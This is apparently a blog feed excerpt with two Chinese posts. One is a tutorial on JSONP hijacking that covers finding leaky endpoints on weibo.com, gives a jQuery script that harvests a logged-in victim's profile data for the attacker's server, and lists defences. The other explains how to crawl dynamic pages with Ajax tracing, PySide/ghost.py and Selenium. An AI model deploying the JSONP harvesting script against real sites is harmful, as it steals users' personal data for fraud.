劫持漏洞的危害</strong></h3><p><strong>JSONP是一种敏感信息泄露的漏洞</strong>，经过攻击者巧妙而持久地利用，会对企业和用户造成巨大的危害。攻击者通过巧妙设计一个网站，<strong>网站中包含其他网站的JSONP漏洞利用代码</strong>，将链接通过邮件等形式推送给受害人，**如果受害者点击了链接，则攻击者便可以获取受害者的个人的信息，如邮箱、姓名、手机等信息，**这些信息可以被违法犯罪分子用作“精准诈骗”。对方掌握的个人信息越多，越容易取得受害人的信任，诈骗活动越容易成功，给受害人带来的财产损失以及社会危害也就越大。</p><h2 id="J0X03-SOP-漏洞的挖掘思路"><a href="#J0X03-SOP-漏洞的挖掘思路" class="headerlink" title="J0X03 SOP 漏洞的挖掘思路"></a><strong>J0X03 SOP 漏洞的挖掘思路</strong></h2><p>这里我采用chrome浏览器的调试窗口进行挖掘weibo.com中存在的漏洞(测试之前需要登录一下，因为我们需要检测是不是会有敏感信息泄露)</p><p>首先把Preserve log选项勾上，这样用来防止页面刷新跳转的时候访问记录被重置，也方便我们进行下一步的筛选。</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/JSONP%20%E5%8A%AB%E6%8C%81%E5%8E%9F%E7%90%86%E4%B8%8E%E6%8C%96%E6%8E%98%E6%96%B9%E6%B3%952.png" alt="此处输入图片的描述"></p><p>然后 F5 刷新，进入 NetWork 标签 ，CTRL+F 查找一些关键词 如 callback json jsonp email</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/JSONP%20%E5%8A%AB%E6%8C%81%E5%8E%9F%E7%90%86%E4%B8%8E%E6%8C%96%E6%8E%98%E6%96%B9%E6%B3%953.png" alt="此处输入图片的描述"></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/JSONP%20%E5%8A%AB%E6%8C%81%E5%8E%9F%E7%90%86%E4%B8%8E%E6%8C%96%E6%8E%98%E6%96%B9%E6%B3%954.png" alt="此处输入图片的描述"></p><p>然后我们需要人工确认这个请求的返回值是否有泄露用户的敏感信息，并且能被不同的域的页面去请求获取，这里以上面查找到的 jsonp 为例</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/JSONP%20%E5%8A%AB%E6%8C%81%E5%8E%9F%E7%90%86%E4%B8%8E%E6%8C%96%E6%8E%98%E6%96%B9%E6%B3%955.png" alt="此处输入图片的描述"></p><p>发现并不是什么很有价值的信息，再来看看能不能被不同的域的页面请求到(也就是测试一下服务器端有没有对其验证请求来源）</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/JSONP%20%E5%8A%AB%E6%8C%81%E5%8E%9F%E7%90%86%E4%B8%8E%E6%8C%96%E6%8E%98%E6%96%B9%E6%B3%956.png" alt="此处输入图片的描述"></p><p>发现换成了别的浏览器还是能检测到，说明验证的来源有些问题</p><blockquote><p><strong>注意：</strong></p><p>上面的测试只是我为了简单的演示整个流程，所以在测试前我并没有登录，因此，上面的测试并不能说明漏洞存在</p></blockquote><p><strong>当然，这种人工的低效的检测方式我们完全可以将其变成主动或者被动的扫描器实现，那样效率会高得多</strong></p><p>自动化测试工具Selenium + Proxy + 验证脚本</p><p>(1)Selenium：可用于自动化对网页进行测试，“到处”点击按钮、超链接，以期待测试更多的接口；<br>(2)Proxy：用于代理所有的请求，过滤出所有包含敏感信息的JSONP请求，并记录下HTTP请求；<br>(3)验证脚本：使用上述的HTTP请求，剔除referer字段，再次发出请求，测试返回结果中，是否仍包敏感信息，如果有敏感信息，说明这个接口就是我们要找的！</p><h2 id="0X04-JSONP-漏洞利用技巧"><a href="#0X04-JSONP-漏洞利用技巧" class="headerlink" title="0X04 JSONP 漏洞利用技巧"></a><strong>0X04 JSONP 漏洞利用技巧</strong></h2><h3 id="1-利用技巧"><a href="#1-利用技巧" class="headerlink" title="1.利用技巧"></a><strong>1.利用技巧</strong></h3><p>JSONP 漏洞主要被攻击者用来在受害者不知不觉中窃取他们的隐私数据，常常被一些 APT 组织采用进行信息收集和钓鱼的工作(<a href="https://www.freebuf.com/articles/web/70025.html">水坑攻击</a>)，下面的一个例子就可以说是在模拟水坑攻击</p><p>当我们发现信息泄露的 jsonp 接口以后我们要做的就是在自己的网站上写一个脚本，然后引诱受害者去访问这个网站，一旦访问了这个网站，脚本就会自动运行，就会想这个接口请求用户的敏感数据，并传送到攻击者的服务器上</p><pre><code class="hljs">$.ajax(&#123;url: &#39;https://api.weibo.com/2/&#123;隐藏了哦&#125;&#39;,type: &#39;get&#39;,dataType: &#39;jsonp&#39;,&#125;).done(function(json)&#123;var id = json[&quot;data&quot;][&quot;id&quot;];var screen_name = json[&quot;data&quot;][&quot;screen_name&quot;];var profile_image_url = json[&quot;data&quot;][&quot;profile_image_url&quot;];var post_data = &quot;&quot;;post_data += &quot;id=&quot; + id + &quot;&amp;amp;&quot;;post_data += &quot;screen_name=&quot; + screen_name + &quot;&amp;amp;&quot;;post_data += &quot;profile_image_url=&quot; + encodeURIComponent(profile_image_url);console.log(post_data);// 发送到我的服务器上&#125;).fail(function() &#123;&#125;);</code></pre><p>这样就能收到大量用户的敏感信息了</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/JSONP%20%E5%8A%AB%E6%8C%81%E5%8E%9F%E7%90%86%E4%B8%8E%E6%8C%96%E6%8E%98%E6%96%B9%E6%B3%957.png" alt="此处输入图片的描述"></p><p>上述相关代码被一个师傅放在了 github 上，<a href="https://github.com/qiaofei32/jsonp_info_leak">地址</a></p><h3 id="2-相关扩展"><a href="#2-相关扩展" class="headerlink" title="2.相关扩展"></a><strong>2.相关扩展</strong></h3><p>(1)既然是窃取敏感信息，那么敏感信息除了一些 email 手机号 用户名等还有什么呢？没错，甚至可以是 CSRF Token 信息，有时候在 CSRF token 获取不到但是又找不到 XSS 的攻击点的时候不妨考虑一下 jsonp 劫持,看看会不会有惊喜</p><p>(2)还有一点，你有没有觉得这个攻击方式有点类似于 CSRF ，是的，的确很像，因此这也就引出了非常类似的修复方案。</p><h2 id="0X05-防护方案"><a href="#0X05-防护方案" class="headerlink" title="0X05 防护方案"></a><strong>0X05 防护方案</strong></h2><p>1、严格安全的实现 CSRF 方式调用 JSON 文件：限制 Referer 、部署一次性 Token 等。<br>2、严格安装 JSON 格式标准输出 Content-Type 及编码（ Content-Type : application&#x2F;json; charset&#x3D;utf-8 ）。<br>3、严格过滤 callback 函数名及 JSON 里数据的输出。<br>4、严格限制对 JSONP 输出 callback 函数名的长度(如防御上面 flash 输出的方法)。<br>5、其他一些比较“猥琐”的方法：如在 Callback 输出之前加入其他字符(如：&#x2F;**&#x2F;、回车换行)这样不影响 JSON 文件加载，又能一定程度预防其他文件格式的输出。还比如 Gmail 早起使用 AJAX 的方式获取 JSON ，听过在输出 JSON 之前加入 while(1) ;这样的代码来防止 JS 远程调用。</p><h2 id="0X06-参考链接"><a href="#0X06-参考链接" class="headerlink" title="0X06 参考链接"></a><strong>0X06 参考链接</strong></h2><p><a href="http://www.mottoin.com/tech/123337.html">http://www.mottoin.com/tech/123337.html</a><br><a href="https://www.anquanke.com/post/id/97671">https://www.anquanke.com/post/id/97671</a><br><a href="https://xiaix.me/fan-yi-wa-jue-tong-yuan-fang-fa-zhi-xing-lou-dong-same-origin-method-execution/">https://xiaix.me/fan-yi-wa-jue-tong-yuan-fang-fa-zhi-xing-lou-dong-same-origin-method-execution/</a><br><a href="https://wooyun.js.org/drops/JS%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%EF%BC%9A%E4%B8%8D%E5%AE%B9%E5%BF%BD%E8%A7%86%E7%9A%84WEB%E6%BC%8F%E6%B4%9E.html">https://wooyun.js.org/drops/JS%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%EF%BC%9A%E4%B8%8D%E5%AE%B9%E5%BF%BD%E8%A7%86%E7%9A%84WEB%E6%BC%8F%E6%B4%9E.html</a><br><a href="https://www.infosec-wiki.com/?p=455211">https://www.infosec-wiki.com/?p=455211</a><br><a href="https://www.cnblogs.com/52php/p/5677775.html">https://www.cnblogs.com/52php/p/5677775.html</a><br><a href="http://www.91ri.org/13407.html">http://www.91ri.org/13407.html</a><br><a href="https://www.freebuf.com/articles/web/70025.html">https://www.freebuf.com/articles/web/70025.html</a></p>]]></content>
    
    
    <categories>
      
      <category>漏洞分析</category>
      
    </categories>
    
    
    <tags>
      
      <tag>前端</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>爬虫爬取动态网页的三种方式简介</title>
    <link href="/2019/03/05/%E7%88%AC%E8%99%AB%E7%88%AC%E5%8F%96%E5%8A%A8%E6%80%81%E7%BD%91%E9%A1%B5%E7%9A%84%E4%B8%89%E7%A7%8D%E6%96%B9%E5%BC%8F%E7%AE%80%E4%BB%8B/"/>
    <url>/2019/03/05/%E7%88%AC%E8%99%AB%E7%88%AC%E5%8F%96%E5%8A%A8%E6%80%81%E7%BD%91%E9%A1%B5%E7%9A%84%E4%B8%89%E7%A7%8D%E6%96%B9%E5%BC%8F%E7%AE%80%E4%BB%8B/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a><strong>0x00 前言</strong></h2><p>最近在看类似的问题的时候找了一些资料，发现网上有一篇文章写得很详细(准确的说是分成三篇文章写的)，特别是手工逆向的方式还是挺有趣的，我也照着他的方式尝试了一下，学到一点东西，下面是这三篇文章的部分内容(有删改，外加其它的一些理解),如果想看原文的话，我在本文最后会附上原文的链接，至于目前最流行的使用  chrome headless 写动态爬虫的方法，由于原作者写的也不是很仔细，所以我还要再找些资料仔细研究一下，后面再写一篇文章总结。</p><h2 id="0X01-动态网页简介："><a href="#0X01-动态网页简介：" class="headerlink" title="0X01 动态网页简介："></a><strong>0X01 动态网页简介：</strong></h2><p>在我们编写爬虫时，可能会碰到以下两种问题：</p><span id="more"></span><p>1.我们所需要爬取的数据在网页源代码中并不存在；<br>2.点击下一页跳转页面时，网页的 URL 并没有发生变化；</p><p>造成这种问题原因是，你所正在爬取的页面采取了 js 动态加载的方式，是一个动态网页。</p><p>所谓的动态网页，是指跟静态网页相对的一种网页编程技术。静态网页，随着html代码生成，页面的内容和显示效果就不会发生变化了。而动态网页则不然，其显示的页面则是经过Javascript处理数据后生成的结果，可以发生改变。<strong>这些数据的来源有多种，可能是经过Javascript计算生成的，也可能是通过Ajax加载的。</strong></p><p>动态网页经常使用的一种技术是Ajax请求技术。</p><blockquote><p>Ajax &#x3D; Asynchronous JavaScript and XML（异步的 JavaScript 和XML），其最大的优点是在<strong>不重新加载整个页面的情况下</strong>，可以与服务器交换数据并更新部分网页的内容。</p></blockquote><p>目前，越来越多的网站采取的是这种动态加载网页的方式，一来是可以实现web开发的前后端分离，减少服务器直接渲染页面的压力；<strong>二来是可以作为反爬虫的一种手段。</strong></p><h2 id="0X02-动态网页抓取"><a href="#0X02-动态网页抓取" class="headerlink" title="0X02 动态网页抓取"></a><strong>0X02 动态网页抓取</strong></h2><h3 id="1-逆向回溯法"><a href="#1-逆向回溯法" class="headerlink" title="(1)逆向回溯法"></a><strong>(1)逆向回溯法</strong></h3><p>对于动态加载的网页，我们想要获取其网页数据，<strong>需要了解网页是如何加载数据的</strong>，该过程就被成为逆向回溯。</p><p>对于使用了Ajax 请求技术的网页，我们可以找到Ajax请求的具体链接，直接得到Ajax请求得到的数据。</p><blockquote><p><strong>需要注意的是，构造Ajax请求有两种方式：</strong></p><p>**1.原生的Ajax请求：**会直接创建一个XMLHTTPRequest对象。<br>**2.调用jQuery的ajax()方法：**一般情况下，<code>$.ajax()</code>会返回其创建的XMLHTTPRequest对象；但是，如果<code>$.ajax()</code>的dataType参数指定了为script或jsonp类型，<code>$.ajax()</code>不再返回其创建的XMLHTTPRequest对象。</p></blockquote><p>对于这两种方式，只要创建并返回了XMLHTTPRequest对象，就可以通过Chrome浏览器的调试工具在NetWork窗口设置过滤条件为 xhr ，直接筛选出Ajax请求的链接；如果是$.ajax()并且dataType指定了为script或jsonp**(这种情况下NetWork 里面的 Type 都是 script，如果你懂得 jsonp 的原理的话就知道 jsonp 本质就是通过 script)<strong>，则无法通过这种方式筛选出来</strong>(因为这两种方式是经典的跨域方法，而 XHR 是不能跨域的，所以设置 XHR 过滤)**。</p><h4 id="示例："><a href="#示例：" class="headerlink" title="示例："></a><strong>示例：</strong></h4><p>接下来以 <a href="http://book.sina.com.cn/excerpt/">新浪读书——书摘</a> 为例，介绍如何得到无法筛选出来的Ajax请求链接:</p><p>在Chrome中打开网页，右键检查，会发现首页中书摘列表包含在一个id为subShowContent1_static的div中，而查看网页源代码会发现id为subShowContent1_static的div为空。</p><p><strong>如图所示：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E9%81%97%E6%BC%8F%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%861.png" alt="此处输入图片的描述"></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E9%81%97%E6%BC%8F%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%862.png" alt="此处输入图片的描述"></p><p>并且点击更多书摘或下一页时，网页URL并没有发生变化。</p><p>这与我们最前面所说的两种情况相同，说明这个网页就是使用 JS 动态加载数据的。</p><p>F12打开调试工具，打开NetWork窗口，F5刷新，可以看到浏览器发送以及接收到的数据记录(我们可以点击上面的 XHR 或者 JS 对这些请求进行过滤)：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E9%81%97%E6%BC%8F%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%863.png" alt="此处输入图片的描述"></p><p>可以发现目前两种类型的请求都是存在的，暂时还不能判断我们 <strong>div 中内容</strong>的动态加载使用的是哪一种方式，不过没关系，我们可以进一步进行测试。</p><h5 id="1-根据-id-进行查找"><a href="#1-根据-id-进行查找" class="headerlink" title="1.根据 id 进行查找"></a><strong>1.根据 id 进行查找</strong></h5><p>我们知道,js 操作页面的数据一定要进行定位，最常用的方法就是使用 id 定位，因为 id 在整个页面中是唯一的，那么我们第一步就是在所有的 js 文件中找和 subShowContent1_static 这个 id 相关的文件，于是我在 network 页面使用 ctrl+f 进行全局搜索</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E9%81%97%E6%BC%8F%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%864.png" alt="此处输入图片的描述"></p><p>最终定位到了可能性最大的文件 feedlist.js</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E9%81%97%E6%BC%8F%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%865.png" alt="此处输入图片的描述"></p><p>进入这个文件以后我就定位到了一个匿名函数 $(),这个函数将参数传入 Listmore() 函数</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E9%81%97%E6%BC%8F%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%866.png" alt="此处输入图片的描述"></p><p>listmore() 函数调用了 Getmorelist() 函数</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E9%81%97%E6%BC%8F%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%867.png" alt="此处输入图片的描述"></p><p>Getmorelist() 函数 调用了 getMore() 函数</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E9%81%97%E6%BC%8F%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%868.png" alt="此处输入图片的描述"></p><p>getmore() 函数定义了我们的请求</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E9%81%97%E6%BC%8F%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%869.png" alt="此处输入图片的描述"></p><h5 id="2-设置断点进行动态捕获"><a href="#2-设置断点进行动态捕获" class="headerlink" title="2.设置断点进行动态捕获"></a><strong>2.设置断点进行动态捕获</strong></h5><p>可以看到这里使用的是 jsonp 的形式跨域传递数据的，然后 URL 是一个对象，是运行中生成的，我们可以在运行中对这个函数添加一个断点</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E9%81%97%E6%BC%8F%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%8610.png" alt="此处输入图片的描述"></p><p>然后 f5 刷新</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E9%81%97%E6%BC%8F%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%8611.png" alt="此处输入图片的描述"></p><p>断下来以后就能看到我们想要看到的 URL 以及后面跟着的参数了，这样就可以根据jQuery的ajax()用法构造正确的Ajax 请求链接：</p><pre><code class="hljs">http://feed.mix.sina.com.cn/api/roll/get?callback=xxxxxxxx&amp;pageid=96&amp;lid=560&amp;num=20&amp;page=1</code></pre><p>那么这个 callback 是多少呢，我们现在还看不出来，但是，既然这个是一个请求，那么肯定会在 network 中有记录，我们找找看</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E9%81%97%E6%BC%8F%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%8612.png" alt="此处输入图片的描述"></p><p>我们现在就锁定了我们想要找的链接，得到Ajax请求链接之后，可以直接得到请求的数据，一般为json格式，处理后即可使用。</p><blockquote><p><strong>注：</strong></p><p>其实当你有了经验之后，对一些不是很复杂的网页，根本就不用进行这么复杂的逆向工程，凭URL形式可以很快的在NetWork窗口 选择-验证 出所需的Ajax请求。</p></blockquote><h3 id="2-渲染动态网页法"><a href="#2-渲染动态网页法" class="headerlink" title="(2)渲染动态网页法"></a><strong>(2)渲染动态网页法</strong></h3><h4 id="1-浏览器渲染引擎："><a href="#1-浏览器渲染引擎：" class="headerlink" title="1.浏览器渲染引擎："></a><strong>1.浏览器渲染引擎：</strong></h4><h5 id="1-简介："><a href="#1-简介：" class="headerlink" title="(1)简介："></a><strong>(1)简介：</strong></h5><p>在介绍这种方式之前，我们需要首先了解一些浏览器渲染引擎的基本知识。</p><p>渲染引擎的职责就是渲染，即在浏览器窗口中显示所请求的内容。浏览器向服务器发送请求，得到服务器返回的资源文件后，需要经过渲染引擎的处理，将资源文件显示在浏览器窗口中。</p><p><strong>目前使用较为广泛的渲染引擎有两种：</strong></p><pre><code class="hljs">webkit——使用者有Chrome, SafariGeoko——使用者有Firefox</code></pre><h5 id="2-渲染主流程："><a href="#2-渲染主流程：" class="headerlink" title="(2)渲染主流程："></a><strong>(2)渲染主流程：</strong></h5><p>渲染引擎首先通过网络获得所请求文档的内容，通常以8K分块的方式完成。</p><p><strong>下面是渲染引擎在取得内容之后的基本流程：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E9%81%97%E6%BC%8F%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%8613.png" alt="此处输入图片的描述"></p><blockquote><p>解析html来构建dom树 -&gt; 构建render树 -&gt; 布局render树 -&gt; 绘制render树</p></blockquote><ul><li><p>渲染引擎开始解析html，并将标签转化为内容树中的dom节点**。如果遇到JS，那么此时会启用另外的连接进行下载(下载过程中 dom 树的构建不会停止)，并且在下载完成后立即执行(执行过程中会阻塞 浏览器的其他行为，因为 js 的运行可能会改变 dom 树的结构，为了不让刚刚构建好的 dom 树又被 js 改变，聪明的浏览器停止了 dom 树的构建)。**</p></li><li><p>接着，它解析外部CSS文件及style标签中的样式信息。这些样式信息以及html中的可见性指令将被用来构建另一棵树——render树(其实这一步是和上一步同时进行的，为了页面显示更迅速，css 不会等到 dom 树构建完毕才开始构建 render树 )。</p></li><li><p>Render树由一些包含有颜色和大小等属性的矩形组成，它们将被按照正确的顺序显示到屏幕上。</p></li><li><p>Render树构建好了之后，将会执行布局过程，它将确定每个节点在屏幕上的确切坐标。</p></li><li><p>再下一步就是绘制，即遍历render树，并使用UI后端层绘制每个节点。</p></li></ul><blockquote><p><strong>补充知识：</strong></p><p><strong>1.浏览器会解析三个东西：</strong> </p><p>（1） HTML&#x2F;SVG&#x2F;XHTML，解析这三种文件会产生一个 DOM Tree。<br>（2） CSS，解析 CSS 会产生 CSS 规则树(CSSOM)。<br>（3） Javascript脚本，主要是通过 DOM API 和 CSSOM API 来操作 DOM Tree 和 CSS Rule Tree.</p><p><strong>2.形象的HTML页面加载和解析流程:</strong></p><ol><li>用户输入网址（假设是个html页面，并且是第一次访问），浏览器向服务器发出请求，服务器返回html文件</li><li>浏览器开始载入html代码，发现＜head＞标签内有一个＜link＞标签引用外部CSS文件； </li><li>浏览器又发出CSS文件的请求，服务器返回这个CSS文件； </li><li>浏览器继续载入html中＜body＞部分的代码，并且CSS文件已经拿到手了，可以开始渲染页面了； </li><li>浏览器在代码中发现一个＜img＞标签引用了一张图片，向服务器发出请求。此时浏览器不会等到图片下载完，而是继续渲染后面的代码； </li><li>服务器返回图片文件，由于图片占用了一定面积，影响了后面段落的排布，因此浏览器需要回过头来重新渲染这部分代码； </li><li>浏览器发现了一个包含一行Javascript代码的＜script＞标签，赶快运行它； </li><li>Javascript脚本执行了这条语句，它命令浏览器隐藏掉代码中的某个＜div＞ （style.display&#x3D;”none”）。突然少了这么一个元素，浏览器不得不重新渲染这部分代码； </li><li>终于等到了＜&#x2F;html＞的到来，浏览器泪流满面…… </li><li>等等，还没完，用户点了一下界面中的“换肤”按钮，Javascript让浏览器换了一下＜link＞标签的CSS路径</li><li>浏览器召集了在座的各位＜div＞＜span＞＜ul＞＜li＞们，“大伙儿收拾收拾行李，咱得重新来过……”，浏览器向服务器请求了新的CSS文件，重新渲染页面。</li></ol><p><strong>3.Javascript的加载和执行的特点：</strong> </p><p>(1)载入后马上执行；<br>(2)执行时会阻塞页面后续的内容（包括页面的渲染、其它资源的下载）。原因：因为浏览器需要一个稳定的DOM树结构，而JS中很有可能有代码直接改变了DOM树结构，比如使用 document.write 或appendChild,甚至是直接使用的location.href进行跳转，浏览器为了防止出现JS修改DOM树，需要重新构建DOM树的情况，所以就会阻塞其他的下载和呈现。</p></blockquote><h5 id="3-思考："><a href="#3-思考：" class="headerlink" title="(3)思考："></a><strong>(3)思考：</strong></h5><blockquote><p><strong>了解了浏览器渲染引擎的基本原理，我们可以发现：</strong></p><p>当浏览器渲染引擎完成了dom树以及render树的构建之后，树中就已经包含了我们在浏览器窗口中可以看到的所有数据。</p></blockquote><p>那么我们就有了一种爬取动态网页的<strong>新思路：</strong></p><p>在浏览器渲染引擎执行layout以及printing之前，得到dom树或者render树，从树中获取动态加载的数据。</p><h4 id="2-渲染动态网页："><a href="#2-渲染动态网页：" class="headerlink" title="2.渲染动态网页："></a><strong>2.渲染动态网页：</strong></h4><h5 id="1-有两种选择："><a href="#1-有两种选择：" class="headerlink" title="(1)有两种选择："></a><strong>(1)有两种选择：</strong></h5><p>1.自己从头实现一个浏览器渲染引擎，在合适的时机返回构建的dom树或render树：这需要进行大量的工作，需要考虑html、js、css等不同格式文件的解析方式以及解析顺序等。</p><p>2.接下来将使用WebKit 渲染引擎，通过 <a href="http://pyside.github.io/docs/pyside/">PySide</a> 这个python库可以获得该引擎的一个便捷接口。</p><p>由于相当于第一种方法来说，第二种方法稍微简单一些，于是这里以第二种为例</p><h5 id="2-示例："><a href="#2-示例：" class="headerlink" title="(2)示例："></a><strong>(2)示例：</strong></h5><p>还是以 <a href="http://book.sina.com.cn/excerpt/">新浪读书——书摘</a> 为例，可以发现：页面中文章列表的部分是动态加载的。</p><p>使用PySide库进行处理的示例代码如下：</p><pre><code class="hljs">#coding=utf-8from PySide.QtGui import *from PySide.QtCore import *from PySide.QtWebKit import *if __name__ == &#39;__main__&#39;:    url = &quot;http://book.sina.com.cn/excerpt/rwws/&quot;    app = QApplication([])  # 完成其他Qt对象之前，必须先创建该对象    webview = QWebView()  # 该对象是Web 对象的容器    # 调用show方法显示窗口    # webview.show()    # 设置循环事件， 并等待网页加载完成    loop = QEventLoop()    webview.loadFinished.connect(loop.quit)    webview.load(QUrl(url))    loop.exec_()    frame = webview.page().mainFrame()  # QWebFrame类有很多与网页交互的有用方法    # 得到页面渲染后的html代码    html = frame.toHtml()    print html</code></pre><p>通过print语句，我们可以发现：页面的源码html中已经包含了动态加载的内容。</p><p><strong>与网站交互：</strong></p><p>得到动态加载的内容后，需要解决的另一个问题是翻页问题。还好PySide库的QWebKit模块还有一个名为QWebFrame的类，支持很多与网页的交互操作。</p><p><strong>如“点击”：</strong></p><pre><code class="hljs">#根据CSS Selector 找到所需“进行翻页”的元素elem = frame.findFirstElement(&#39;#subShowContent1_loadMore&#39;)# 点击：通过evaluateJavaScript()函数可以执行Js代码elem.evaluateJavaScript(&#39;this.click()&#39;)</code></pre><p>除了点击事件，还可以进行填充表单，滚动窗口等操作</p><blockquote><p>需要注意的是，在进行了翻页、或者获取更多内容时，一个最大的难点在于如何确定页面是否完成了加载，因为我们难以估计Ajax事件或者Js准备数据的时间。</p></blockquote><p><strong>对于这个问题有两种解决思路：</strong></p><p>(1)等待固定的一段时间，比如time.sleep(3)：这种方法容易实现，但效率较低。</p><p>(2)轮询网页，等待特定内容出现：这种方法虽然会在检查是否加载完成时浪费CPU周期，但更加可靠。</p><p><strong>以下是一个简单的实现：</strong></p><pre><code class="hljs">elem = Nonewhile not elem: app.processEvents() elem = frame.findAllElemnets(&#39;#pattern&#39;)</code></pre><p>代码循环，直到出现特定元素。每次循环，调用app.processEvents()方法，用于给Qt事件循环执行任务的时间，比如响应点击事件。</p><p>但是PySide毕竟是一个为了Python的GUI 编程而开发的， 其功能对于爬虫来说实在是太过于庞大，所以我们可以把爬虫经常使用的功能进行封装，来提升编写爬虫的效率。</p><h5 id="3-对PySide-常用功能的封装-——-ghost-py"><a href="#3-对PySide-常用功能的封装-——-ghost-py" class="headerlink" title="(3)对PySide 常用功能的封装 —— ghost.py"></a><strong>(3)对PySide 常用功能的封装 —— ghost.py</strong></h5><p><a href="https://ghost-py.readthedocs.io/en/latest/#">ghost.py</a> 是目前一个针对爬虫且功能比较完善的PySide的封装模块，使用它可以很方便的进行数据采集。</p><p>还是以获取列表页中每篇文章详情页地址为目标，</p><h6 id="1-示例代码："><a href="#1-示例代码：" class="headerlink" title="1.示例代码："></a><strong>1.示例代码：</strong></h6><pre><code class="hljs"># coding=utf-8import reimport timefrom ghost import Ghost, Sessionclass SinaBookSpider(object):    # 初始化相关参数    gh = Ghost()    ss = Session(gh, display=True)  # 设置display为true, 方便调试    total = 1526  # 预先计算的总数据量    count = 0  # 已爬取的数据量    # 记录解析以及翻页位置    location = 0    click_times = 0    def run(self):        &quot;&quot;&quot;        开始爬虫        :return:        &quot;&quot;&quot;        # 打开网页        self.ss.open(&quot;http://book.sina.com.cn/excerpt/rwws/&quot;)        # 等待数据加载完成        self.ss.wait_for_selector(&#39;#subShowContent1_static &gt; div:nth-child(20)&#39;)        self.parselist()        while self.count &lt; self.total:            if self.click_times is 0:                # 点击加载更多                self.ss.click(&#39;#subShowContent1_loadMore&#39;)                # 每次翻页，或加载更多，要等待至加载完成                self.ss.wait_for_selector(&#39;#subShowContent1_static &gt; div:nth-child(21)&#39;)                self.click_times += 1                self.parselist()            elif self.click_times is 1:                self.ss.click(&#39;#subShowContent1_loadMore&#39;)                self.ss.wait_for_selector(&#39;#subShowContent1_static &gt; div:nth-child(41)&#39;)                self.click_times += 1                self.parselist()            elif self.click_times is 2:                self.ss.click(&#39;#subShowContent1_page .pagebox_next a&#39;)                self.ss.sleep(2)                self.click_times = 0                self.location = 0                self.parselist()    def parselist(self):        &quot;&quot;&quot;        解析列表页        :return:        &quot;&quot;&quot;        html = self.ss.content.encode(&#39;utf8&#39;)        # print html        pattern = re.compile(r&#39;&lt;div class=&quot;item&quot;&gt;&lt;h4&gt;&lt;a href=&quot;(.*?)&quot; target=&quot;_blank&quot;&gt;&#39;, re.M)        links = pattern.findall(html)        for i in range(self.location, len(links)):            print links[i]            self.count += 1            self.location += 1        print self.countif __name__ == &#39;__main__&#39;:    spider = SinaBookSpider()    spider.run()</code></pre><h6 id="2-代码地址："><a href="#2-代码地址：" class="headerlink" title="2.代码地址："></a><strong>2.代码地址：</strong></h6><p><a href="https://github.com/linbo-lin/dynamic-web-process">https://github.com/linbo-lin/dynamic-web-process</a></p><h6 id="3-补充："><a href="#3-补充：" class="headerlink" title="3.补充："></a><strong>3.补充：</strong></h6><p>ghost.py对直接获取元素支持的不是很好，但可以借助BeautifulSoup或正则表达式来解决。</p><p>ghost.py支持与网页的简单交互，如点击，填充表单等</p><ul><li>set_field_value(*args, **kwargs)</li><li>fill(*args, **kwargs)</li><li>click(*args, **kwargs)</li></ul><p>ghost.py很好的解决了确定元素加载完成的问题，通过以下方法可以让爬虫等待，直到满足设置的条件。</p><ul><li>wait_for(condition, timeout_message, timeout&#x3D;None)</li><li>wait_for_page_loaded(timeout&#x3D;None)</li><li>wait_for_selector(selector, timeout&#x3D;None)</li><li>wait_for_text(text, timeout&#x3D;None)</li><li>wait_while_selector(selector, timeout&#x3D;None)</li></ul><h3 id="3-模拟浏览器行为法"><a href="#3-模拟浏览器行为法" class="headerlink" title="(3)模拟浏览器行为法"></a><strong>(3)模拟浏览器行为法</strong></h3><p>前面的例子中，我们使用WebKit库，可以自定义浏览器渲染引擎，这样就可以完全控制想要执行的行为。如果不需要那么高的灵活性，那么还有一个不错的替代品 <a href="https://docs.seleniumhq.org/">Selenium</a> 可以选择，它提供了使浏览器自动化的API 接口。</p><h4 id="1-Selenium-简介："><a href="#1-Selenium-简介：" class="headerlink" title="1.Selenium 简介："></a><strong>1.Selenium 简介：</strong></h4><p>Selenium 是一个用于Web应用程序测试的工具。Selenium测试直接运行在浏览器中，就像真正的用户在操作一样。支持市面上几乎所有的主流浏览器。</p><p>本来打算使用的是selenium + PhantomJS(由于内部 webkit 